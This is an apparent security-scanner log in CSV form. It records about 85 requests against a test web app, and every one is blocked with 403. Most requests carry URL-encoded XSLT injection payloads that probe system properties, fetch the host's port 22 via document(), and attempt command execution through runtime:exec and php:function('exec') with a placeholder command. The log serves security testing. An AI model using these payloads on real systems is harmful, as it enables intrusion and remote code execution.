ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
6566,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,403,Forbidden,150,567,32225
6567,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,403,Forbidden,169,567,32211
6568,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/favicon.ico?favicon.3fpu2ql9ns1a0.ico=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,169,567,32225
6569,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,403,Forbidden,168,567,32218
6570,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,403,Forbidden,172,567,32218
6571,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,403,Forbidden,173,567,32222
6572,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,403,Forbidden,170,567,32228
6573,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,403,Forbidden,173,567,32218
6574,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=system-property%28%27xsl%3Avendor%27%29%2F%3E&_rsc=tXyZJ52UQVBCVsD3,403,Forbidden,164,567,32228
6575,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,POST,https://t-f-cl-test-003.vercel.app/login?next=%2Fcheckout,403,Forbidden,179,567,32211
6576,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,187,567,32222
6577,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/user/005c9b24-b1d2-47b1-afe3-c98b4f4320b2?_rsc=%3C,403,Forbidden,173,567,32218
6578,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/checkout?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,157,567,32215
6579,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/5?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,162,567,32211
6580,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/8?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,159,567,32235
6581,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/7?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,173,567,32211
6582,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/orders?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,187,567,32211
6583,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,187,567,32215
6584,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/6?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,171,567,32210
6585,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,POST,https://t-f-cl-test-003.vercel.app/login?next=%2Fcheckout,403,Forbidden,148,567,32211
6586,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/3?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,154,567,32211
6587,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,151,567,32225
6588,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_rsc=tXyZJ52UQVBCVsD3,403,Forbidden,161,567,32210
6589,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/4?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,170,567,32218
6590,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/1?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,168,567,32210
6591,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/2?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,174,567,32215
6592,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/9?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,181,567,32227
6593,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/10?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,180,567,32221
6594,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/favicon.ico?favicon.3fpu2ql9ns1a0.ico=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,193,567,32219
6595,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/user/005c9b24-b1d2-47b1-afe3-c98b4f4320b2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,403,Forbidden,182,567,32226
6596,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/8?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,149,567,32210
6597,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/orders?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,146,567,32210
6598,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,178,567,32215
6599,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/5?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,176,567,32215
6600,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_rsc=tXyZJ52UQVBCVsD3,403,Forbidden,158,567,32215
6601,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,172,567,32209
6602,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/7?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,192,567,32210
6603,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,174,567,32235
6604,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/6?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,187,567,32210
6605,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,POST,https://t-f-cl-test-003.vercel.app/login?next=%2Fcheckout,403,Forbidden,182,567,32215
6606,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/3?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,183,567,32221
6607,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/4?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,176,567,32215
6608,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/1?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,173,567,32219
6609,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/10?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,169,567,32217
6610,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/9?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,172,567,32225
6611,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/2?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,184,567,32231
6612,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/favicon.ico?favicon.3fpu2ql9ns1a0.ico=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,169,567,32219
6613,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/user/005c9b24-b1d2-47b1-afe3-c98b4f4320b2?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,403,Forbidden,156,567,32226
6614,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,146,567,32210
6615,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,164,567,32222
6616,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E&_rsc=tXyZJ52UQVBCVsD3,403,Forbidden,145,567,32211
6617,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,151,567,32218
6618,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/orders?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,181,567,32231
6619,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,160,567,32221
6620,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,175,567,32212
6621,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,POST,https://t-f-cl-test-003.vercel.app/login?next=%2Fcheckout,403,Forbidden,181,567,32210
6622,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,184,567,32209
6623,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,213,567,32222
6624,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,180,567,32218
6625,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,186,567,32210
6626,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,195,567,32217
6627,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,201,567,32222
6628,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,193,567,32227
6629,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,190,567,32226
6630,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/favicon.ico?favicon.3fpu2ql9ns1a0.ico=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,186,567,32215
6631,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/user/005c9b24-b1d2-47b1-afe3-c98b4f4320b2?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,190,567,32210
6632,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:37 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/8?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,172,567,32218
6633,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&_rsc=tXyZJ52UQVBCVsD3,403,Forbidden,171,567,32210
6634,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/checkout?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,180,567,32219
6635,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?next=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,181,567,32222
6636,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,142,567,32219
6637,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,159,567,32217
6638,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/orders?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,206,567,32219
6639,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,151,567,32222
6640,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/6?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,171,567,32215
6641,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/login?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,161,567,32210
6642,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/9?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,164,567,32228
6643,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/user/005c9b24-b1d2-47b1-afe3-c98b4f4320b2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,403,Forbidden,148,567,32222
6644,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/5?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,175,567,32219
6645,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/favicon.ico?favicon.3fpu2ql9ns1a0.ico=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,160,567,32210
6646,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,180,567,32231
6647,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/7?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,176,567,32209
6648,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/4?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ft-f-cl-test-003.vercel.app%3A22%27%29%22%2F%3E,403,Forbidden,178,567,32209
6649,Mon Sep 07 19:40:37 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/products/8?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,403,Forbidden,155,567,32222
6650,Mon Sep 07 19:40:38 BDT 2026,Mon Sep 07 19:40:38 BDT 2026,GET,https://t-f-cl-test-003.vercel.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,403,Forbidden,162,567,32217
